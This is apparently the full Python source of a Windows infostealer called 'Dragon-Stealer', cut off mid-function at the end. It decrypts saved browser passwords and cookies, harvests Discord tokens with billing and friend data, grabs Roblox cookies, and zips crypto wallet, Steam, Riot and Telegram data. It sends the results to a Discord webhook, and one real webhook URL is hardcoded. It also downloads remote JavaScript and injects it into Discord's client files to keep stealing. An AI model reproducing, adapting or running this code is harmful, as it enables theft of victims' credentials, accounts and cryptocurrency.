import os
import threading
import re
import time
import shutil
import random
import subprocess
import platform
import socket
import getpass
import platform
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from sys import executable
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from json import loads, dumps
from zipfile import ZipFile


if platform.system() == "Windows":
    # If running on Windows, do nothing and continue with the program
    pass
else:
    # If not running on Windows, exit the program
    quit()

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hook = "WEBHOOK HERE"
debug_mode = False

if hwid == "5A25762A-89E6-8A18-A523-00D861C74757":
    debug_mode = True
    hook = "https://canary.discord.com/api/webhooks/1078237508833390683/4lQklEhIbk-T8H7Bfw6mPWipA3onoRfHu-o9BW7yHQvxyLtKjm4gHq-qq8DTrfDO19aU"

try:
    import requests
    from PIL import ImageGrab

except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install pillow")

DETECTED = False


def getip():
    ip = "None"
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    return ip


requirements = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"], ["PIL", "pillow"], ["discord", "discord"], ["wmi", "wmi"], ["psutil", "psutil"]]
for modl in requirements:
    try:
        __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Threadlist = []
footer = "Dragon-Stealer modified by Gumbobrot#4888 | https://github.com/Gumbobrot/"
avatar = "https://i.imgur.com/82x4nYk.jpeg"
color = 1578778

class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def LoadRequests(methode, url, data="", files="", headers=""):
    for i in range(8):  # max trys
        if methode == "POST":
            if data != "":
                r = requests.post(url, data=data)
                if r.status_code == 200:
                    return r
            elif files != "":
                r = requests.post(url, files=files)
                if (r.status_code == 200
                        or r.status_code == 413):  # 413 = DATA TO BIG
                    return r


def LoadUrlib(hook, data="", files="", headers=""):
    for i in range(8):
        if headers != "":
            r = urlopen(Request(hook, data=data, headers=headers))
            return r
        else:
            r = urlopen(Request(hook, data=data))
            return r


payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": "Dragon-Stealer", "avatar_url": avatar}
response = requests.post(hook, json=payload)


def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = (urlopen(Request(
        f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace(
            "callback(", "").replace("})", "}"))
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:   -   `{username.upper()}  -  {ip} [{contry}]`"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < 1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
    
class Discord(): #Updating soon
    def __init__(self):
        if debug_mode:
            print("Discord Init")
        
    


    def GetUHQFriends(self, token):
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            friendlist = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/v6/users/@me/relationships",
                        headers=headers,
                    )).read().decode())
        except:
            return False

        uhqlist = ""
        for friend in friendlist:
            OwnedBadges = ""
            flags = friend["user"]["public_flags"]
            for badge in badgeList:
                if flags // badge["Value"] != 0 and friend["type"] == 1:
                    if not "House" in badge["Name"]:
                        OwnedBadges += badge["Emoji"]
                    flags = flags % badge["Value"]
            if OwnedBadges != "":
                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
        return uhqlist


    def GetBilling(self, token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            billingjson = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/users/@me/billing/payment-sources",
                        headers=headers,
                    )).read().decode())
        except:
            return False

        if billingjson == []:
            return "?"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += ":parking: "

        return billing


    def GetBadge(self, flags):
        if flags == 0:
            return ""

        OwnedBadges = ""
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges


    def GetTokenInfo(self, token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }

        userjson = loads(
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in userjson:
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<:classic:896119171019067423> "
            elif nitrot == 2:
                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
        if "phone" in userjson:
            phone = f'```{userjson["phone"]}```'

        return username, hashtag, email, idd, pfp, flags, nitro, phone


    def checkToken(self, token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers))
            return True
        except:
            return False


    def uploadToken(self, token):
        global hook
        headers = {
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)

        if pfp == None:
            pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
        else:
            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

        billing = self.GetBilling(token)
        badge = self.GetBadge(flags)
        friends = self.GetUHQFriends(token)
        if friends == "":
            friends = "No Rare Friends"
        if not billing:
            badge, phone, billing = "🔒", "🔒", "🔒"
        if nitro == "" and badge == "":
            nitro = "?"

        data = {
            "content":
            "",
            "embeds": [{
                "color":
                color,
                "fields": [
                    {
                        "name": ":tickets:   -   Token:",
                        "value": f"```{token}```",
                    },
                    {
                        "name": ":earth_asia:   -   Email:",
                        "value": f"```{email}```",
                        "inline": True,
                    },
                    {
                        "name": ":telephone_receiver:   -   Phone:",
                        "value": f"{phone}",
                        "inline": True,
                    },
                    {
                        "name": ":globe_with_meridians:   -   IP:",
                        "value": f"```{getip()}```",
                        "inline": True,
                    },
                    {
                        "name": ":beginner:   -   Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True,
                    },
                    {
                        "name": ":credit_card:   -   Billing:",
                        "value": f"{billing}",
                        "inline": True,
                    },
                    {
                        "name": ":office:   -   Friends:",
                        "value": f"{friends}",
                        "inline": False,
                    },
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}",
                },
                "footer": {
                    "text": footer,
                    "icon_url": "",
                },
                "thumbnail": {
                    "url": f"{pfp}"
                },
            }],
            "avatar_url":
            avatar,
            "username":
            "Dragon-Stealer",
            "attachments": [],
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
    while "net" in e:
        e.remove("net")
    return list(set(e))


def upload(name, link):
    headers = {
        "Content-Type":
        "application/json",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    if name == "wpcook":
        rb = "  -  ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = "  -  ".join(da for da in rrrrr)
        data = {
            "content":
            "",
            "embeds": [{
                "title": "Dragon  -  Cookie Grabber",
                "description":
                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[DragonCookies.txt]({link})",
                "color": color,
                "footer": {
                    "text": footer,
                    "icon_url": "",
                },
            }],
            "username":
            "Dragon-Stealer",
            "avatar_url":
            avatar,
            "attachments": [],
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = "  -  ".join(da for da in paswWords)
        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = "  -  ".join(da for da in rrr)

        data = {
            "content":
            "",
            "embeds": [{
                "title": "Dragon  -  Password Grabber",
                "description":
                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[DragonPasswords.txt]({link})",
                "color": color,
                "footer": {
                    "text": footer,
                    "icon_url": "",
                },
            }],
            "username":
            "Dragon-Stealer",
            "avatar_url":
            avatar,
            "attachments": [],
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return


# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"< - lol -->\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


Tokens = ""
dclass = Discord()

def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                dclass.uploadToken(token, path)


Passw = []


def GetPasswords(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "wp" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + ".db")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in paswWords:
                        paswWords.append(old)
            Passw.append(
                f"URL: {row[0]}|Username: {row[1]}|Password: {DecryptValue(row[2], master_key)}"
            )
            PasswCount += 1
    writeforfile(Passw, "passw")


Cookies = []


def GetCookies(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "wp" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + ".db")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in cookiWords:
                        cookiWords.append(old)
            Cookies.append(
                f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
            )
            CookiCount += 1
    writeforfile(Cookies, "cook")


def RobloxCookie(path, arg):
    return
    global roblox_cookie
    pathC = path + arg + "\Cookies"
    tempfold = (
    temp + "wp" +
    "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
            for i in range(8)) + ".db")
    shutil.copy2(pathC, tempfold)
    os.remove(tempfold)
    roblox_cookie = ""
    with open(os.path.join(pathC, "Cookies", "DragonRobloxCookies.txt"), 'w', encoding="utf-8") as f:
        f.write(f"{footer}\n\n")
        with open(os.path.join(pathC, "Cookies", "DragonCookies.txt"), 'r', encoding="utf-8") as f2:
            try:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        roblox_cookie = line.split(".ROBLOSECURITY")[1].strip()
                        f.write(roblox_cookie + "\n")
            except Exception:
                roblox_cookie = "No Roblox Cookies Found :("
        f2.close()
    f.close()


def UploadRobloxCookie(hook):
    headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
    data = {
        "content":
        "",
        "embeds": [{
            "color":
            color,
            "title": "Dragon  -  Roblox Cookie Grabber",
            "fields": [
                {
                    "name": "<:roblox_icon:1041819334969937931> Name:",
                    "value": f"`{info['UserName']}`",
                },
                {
                    "name": "<:robux_coin:1041813572407283842> Robux:",
                    "value": f"`{info['RobuxBalance']}`",
                    "inline": True,
                },
                {
                    "name": "🍪 Cookie:",
                    "value": f"`{roblox_cookie}`",
                    "inline": False,
                },
            ],
            "footer": {
                "text": footer,
                "icon_url": "",
            },
        }],
        "avatar_url":
        avatar,
        "username":
        "Dragon-Stealer",
        "attachments": [],
    }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            dclass.uploadToken(tokenDecoded)


def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings,
                             args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings,
                             args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram,
                         args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip
    # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "", "", ""
    if not len(WalletsZip) == 0:
        wal = ":coin Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type":
        "application/json",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    # Has a problem.

    data = {
        "content":
        "",
        "embeds": [{
            "title": "Dragon  -  Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": color,
            "footer": {
                "text": footer,
                "icon_url": "",
            },
        }],
        "username":
        "Dragon-Stealer",
        "avatar_url":
        avatar,
        "attachments": [],
    }


class Injection():
    def __init__(self, hook):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get("https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js").text

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', hook))
                    self.start_discord(dir)

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if (not ".zip" in file and not "tdummy" in file
                and not "user_data" in file and not "webview" in file):
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file:
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [
            f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"',
            "Wallet"
        ],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
        [
            f"{local}/Riot Games/Riot Client/Data",
            "RiotClientServices.exe",
            "RiotClient",
        ],
    ]
    Telegram = [
        f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"
    ]

    for patt in browserPaths:
        a = threading.Thread(target=GetTokens, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths:
        a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips,
                     args=[browserPaths, PathsToZip, Telegram]).start()
    
    for thread in ThCokk:
        thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True:
        return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]:
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""),
               uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))


def uploadToAnonfiles(path):
    return
    try:
        return requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={
                "file": open(path, "rb")
            },
        ).json()["data"]["downloadPage"]
    except:
        return False


# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False


def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])


KiwiFiles = []


def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([
                        path + "/" + file,
                        uploadToAnonfiles(path + "/" + file)
                    ])
                    break
                if os.path.isdir(path + "/" + file):
